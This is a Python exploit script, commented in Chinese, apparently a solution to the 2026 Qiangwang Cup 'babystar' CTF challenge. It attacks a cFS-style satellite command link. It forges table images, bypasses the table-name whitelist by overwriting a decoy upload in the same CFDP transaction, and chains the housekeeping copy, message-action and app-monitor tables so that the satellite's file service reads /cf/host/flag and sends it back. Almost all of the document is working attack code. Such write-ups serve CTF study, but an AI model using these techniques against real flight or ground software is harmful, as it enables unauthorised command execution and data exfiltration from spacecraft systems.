#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
babystar exploit (2026 强网杯) —— 无附件，纯线上协议。

链路帧：kind(1B: C/F/T/E) + length(4B BE) + payload
攻击面是 cFS 风格的三张可上传表，本质是"表数据被当作可信配置直接执行"：
  HK.CopyTable   ：把地面 C 帧（APID 0x88）的包体搬进遥测包模板 0x18B3（= 写）
  HS.MsgActs_Tbl ：把"发送 MID 0x18B3"登记成一条动作（= 发）
  HS.AppMon_Tbl  ：登记一个不存在的应用，监控命中后立即执行动作（= 触发）
CF class 1 请求体被搬进 0x18B3 后由动作服务发出，星上 CF 服务按源路径
/cf/host/flag 读文件并以 CFDP 文件数据 PDU（目的 EID 25）回传。

时序（题解第 3 节"完整时序"，顺序敏感）：
  upload hk_cf.tbl -> load/validate/activate HK.CopyTable
  upload hs_mat_x.tbl -> load/validate/activate HS.MsgActs_Tbl（封面绕过白名单）
  upload hs_amt_x.tbl -> load/validate（封面绕过）
  send C(carrier)  -> 等一个 HK 周期，让搬运生效
  activate HS.AppMon_Tbl -> 触发动作发送 0x18B3
  receive F frames -> 按 offset 重组 -> 正则取 flag

用法：
    python exp.py TARGET_HOST PORT
    python exp.py --dry-run
"""
import argparse
import re
import socket
import struct
import time

from pwn import context, log

context.log_level = 'info'

MAGIC = 0x63464531           # "cFE1"
TARGET_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999

APID_UPLINK = 0x88          # 地面普通上行命令
APID_FS = 0x04              # 文件/表服务
APID_MAS = 0x9C             # 消息动作服务
MID_CARRIER = 0x18B3        # 遥测包模板（被伪造的包）
MID_GROUND = 0x1888         # 地面命令在总线上的 MID

p32 = lambda x: struct.pack(">I", x)
p16 = lambda x: struct.pack(">H", x)


# ---------------------------------------------------------------- CCSDS / 表镜像
def ccsds(apid, code, body=b""):
    packet = bytearray(struct.pack(">HHHBB", 0x1800 | apid, 0xC000, len(body) + 1, code, 0) + body)
    checksum = 0xFF
    for byte in packet:
        checksum ^= byte
    packet[7] = checksum
    return bytes(packet)


def table_image(name, data):
    fs_header = struct.pack(">8I32s", MAGIC, 8, 64, 0x42, 1, 0, 0, 0, b"Table Image")
    tbl_header = struct.pack(">III40s", 0, 0, len(data), name.encode())
    return fs_header + tbl_header + data


def hk_entry(input_mid, input_offset, output_mid, output_offset, count):
    return struct.pack("<I H 2x I H H", input_mid, input_offset, output_mid, output_offset, count)


# ---------------------------------------------------------------- CFDP
def cfdp_pdu(mode, txn, data):
    """mode 0x20 = metadata/EOF，0x30 = 文件数据；23 本星 EID，25 地面 EID。"""
    return bytes([mode]) + len(data).to_bytes(2, "big") + b"\0" + bytes([23, txn, 25]) + data


def cfdp_checksum(content):
    padded = content + b"\0" * (-len(content) % 4)
    return sum(int.from_bytes(padded[i:i + 4], "big") for i in range(0, len(padded), 4)) & 0xFFFFFFFF


# ---------------------------------------------------------------- 链路
class Link:
    def __init__(self, host, port, timeout=10.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.parts = {}
        self.flag = None
        self.events = []

    # --- 收发 -------------------------------------------------------------
    def send(self, kind, payload):
        if isinstance(kind, str):
            kind = kind.encode()
        self.sock.sendall(kind + len(payload).to_bytes(4, "big") + payload)

    def _read_exact(self, n):
        out = b""
        while len(out) < n:
            chunk = self.sock.recv(n - len(out))
            if not chunk:
                raise EOFError("connection closed")
            out += chunk
        return out

    def recv_frame(self):
        head = self._read_exact(5)
        kind, length = head[:1], int.from_bytes(head[1:], "big")
        payload = self._read_exact(length) if length else b""
        return kind, payload

    def _handle(self, kind, payload):
        if kind == b"E":
            raise RuntimeError("satellite error: %s" % payload.decode("latin-1", "replace"))
        if kind == b"T":
            if payload[:2] == b"\x08\x08":
                text = payload[48:].split(b"\0")[0].decode("latin-1", "replace")
                self.events.append(text)
                return text
            return None
        if kind == b"F":
            if len(payload) >= 11 and (payload[0] & 0x10) and payload[4] == 25:
                offset = int.from_bytes(payload[7:11], "big")
                self.parts[offset] = payload[11:]
                content = b"".join(self.parts[pos] for pos in sorted(self.parts))
                found = re.search(rb"flag\{[^}]+\}", content)
                if found:
                    self.flag = found.group().decode()
            return None
        return None

    def receive(self, seconds=2.0):
        """在 seconds 内尽可能多地收帧，返回事件字符串列表。"""
        deadline = time.time() + seconds
        got = []
        while time.time() < deadline:
            try:
                self.sock.settimeout(max(0.05, deadline - time.time()))
                kind, payload = self.recv_frame()
            except (socket.timeout, EOFError):
                break
            text = self._handle(kind, payload)
            if text:
                got.append(text)
        return got

    def wait_event(self, needle, timeout=10.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            for ev in self.events:
                if needle in ev:
                    return ev
            self.receive(1.0)
        raise RuntimeError("event %r not seen (last: %r)" % (needle, self.events[-3:]))

    # --- CFDP 上传 --------------------------------------------------------
    def upload(self, name, content, txn, overlap=False):
        if overlap:
            # 首个整文件 PDU 的文件系统头里表名必须是 HK.CopyTable 才能过白名单；
            # 封面与真实内容等长，随后同事务号覆盖同一路径。
            cover = table_image("HK.CopyTable", bytes(len(content) - 116))
            assert len(cover) == len(content)
            versions = (cover, content)
        else:
            versions = (content,)

        for ver in versions:
            path = ("/cf/uplink/" + name).encode()
            meta = b"\x07\0" + p32(len(ver))
            meta += bytes([len(path)]) + path + bytes([len(path)]) + path
            self.send(b"F", cfdp_pdu(0x20, txn, meta))

            offset = 0
            while offset < len(ver):
                chunk = ver[offset:offset + 480]
                self.send(b"F", cfdp_pdu(0x30, txn, p32(offset) + chunk))
                offset += len(chunk)

            eof = b"\x04\0" + p32(cfdp_checksum(ver)) + p32(len(ver))
            self.send(b"F", cfdp_pdu(0x20, txn, eof))

        log.info("uploaded /cf/uplink/%s (%d bytes)" % (name, len(content)))
        self.wait_event("successfully retained file as /cf/uplink/%s" % name)

    # --- 表服务 -----------------------------------------------------------
    def load_and_validate(self, filename, table_name):
        self.send(b"C", ccsds(APID_FS, 2, ("/cf/uplink/" + filename).encode().ljust(64, b"\0")))
        self.wait_event("Successful load into working buffer")
        self.send(b"C", ccsds(APID_FS, 4, b"\0\0" + table_name.encode().ljust(40, b"\0")))
        self.wait_event("validation successful")

    def activate(self, table_name):
        self.send(b"C", ccsds(APID_FS, 5, table_name.encode().ljust(40, b"\0")))
        self.wait_event("Successfully Updated '%s'" % table_name)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------- payload
def build_payloads():
    # 1) HK.CopyTable：前 5 条是"看起来正常"的 HK 参数搬运，后 2 条是真正的搬运
    defaults = [0x0801, 0x0805, 0x0803, 0x0800, 0x0804]
    entries = [hk_entry(mid, 12, 0x089C, 12 + 4 * i, 4) for i, mid in enumerate(defaults)]
    entries += [
        hk_entry(MID_GROUND, 8, MID_CARRIER, 8, 136),    # CCSDS 包体整体搬进 0x18B3
        hk_entry(MID_GROUND, 144, MID_CARRIER, 6, 1),    # 功能码字节 -> 0x20（MM NOOP）
    ]
    hk = table_image("HK.CopyTable", b"".join(entries).ljust(2048, b"\0"))

    # 2) HS.MsgActs_Tbl：1 条动作，"发送 MID 0x18B3"
    trigger = ccsds(APID_MAS, 0, struct.pack("<I", MID_CARRIER))
    mat = table_image("HS.MsgActs_Tbl", struct.pack("<HH4x16s", 1, 0, trigger))

    # 3) HS.AppMon_Tbl：监控一个不存在的应用 -> 命中即执行索引 4 的动作
    amt = table_image("HS.AppMon_Tbl", struct.pack("<20sHHH", b"NO_SUCH_APP", 0, 1, 4))

    # 4) CF class 1 请求体：put/读，目的 EID 23（本星），源 /cf/host/flag
    cf_body = struct.pack("<BBBBI64s64s", 0, 1, 1, 0, 23, b"/cf/host/flag", b"flag")
    carrier = ccsds(APID_UPLINK, 0, cf_body + b"\x20")

    assert len(cf_body) == 136 and len(carrier) == 145
    assert len(hk) == 2164 and len(mat) == 140 and len(amt) == 142
    return hk, mat, amt, carrier


def exploit(host, port):
    hk, mat, amt, carrier = build_payloads()
    link = Link(host, port)
    try:
        link.upload("hk_cf.tbl", hk, 200)
        link.load_and_validate("hk_cf.tbl", "HK.CopyTable")
        link.activate("HK.CopyTable")

        link.upload("hs_mat_x.tbl", mat, 201, overlap=True)
        link.load_and_validate("hs_mat_x.tbl", "HS.MsgActs_Tbl")
        link.activate("HS.MsgActs_Tbl")

        link.upload("hs_amt_x.tbl", amt, 202, overlap=True)
        link.load_and_validate("hs_amt_x.tbl", "HS.AppMon_Tbl")

        # 先让 HK 把 CF 请求搬进 0x18B3，至少留一个 HK 周期
        link.send(b"C", carrier)
        link.receive(2)

        # 激活即触发，必须放在 carrier 之后
        link.activate("HS.AppMon_Tbl")

        deadline = time.time() + 30
        while time.time() < deadline and link.flag is None:
            link.receive(2)
        return link.flag, link.parts
    finally:
        link.close()


def main():
    ap = argparse.ArgumentParser(description="babystar exploit")
    ap.add_argument("host", nargs="?", default=TARGET_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    hk, mat, amt, carrier = build_payloads()
    if args.dry_run:
        print("payload sizes:", len(hk), len(mat), len(amt), len(carrier))
        return

    flag, parts = exploit(args.host, args.port)
    if flag:
        print("[+] FLAG:", flag)
    else:
        blob = b"".join(parts[pos] for pos in sorted(parts))
        print("[*] no flag, %d file-data chunks, %d bytes" % (len(parts), len(blob)))
        print(repr(blob[:512]))


if __name__ == "__main__":
    main()
